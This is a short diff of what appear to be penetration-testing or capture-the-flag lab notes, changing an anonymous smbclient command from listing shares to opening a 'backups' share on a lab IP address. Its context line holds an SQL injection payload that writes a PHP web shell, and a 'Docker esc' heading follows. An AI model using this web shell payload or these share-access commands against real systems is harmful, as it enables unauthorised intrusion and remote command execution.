@@ -103,7 +103,7 @@ udugisan3rd' UNION ALL SELECT "<?php system($_GET['cmd']); ?>", NULL, NULL, NULL
 ### smbclient
 ```
 smbclient -N -L \\\\10.129.2.102\\
-smbclient -N -L \\\\10.129.2.102\\backups
+smbclient -N \\\\10.129.2.102\\backups
 ```
 ## Docker esc
 ```
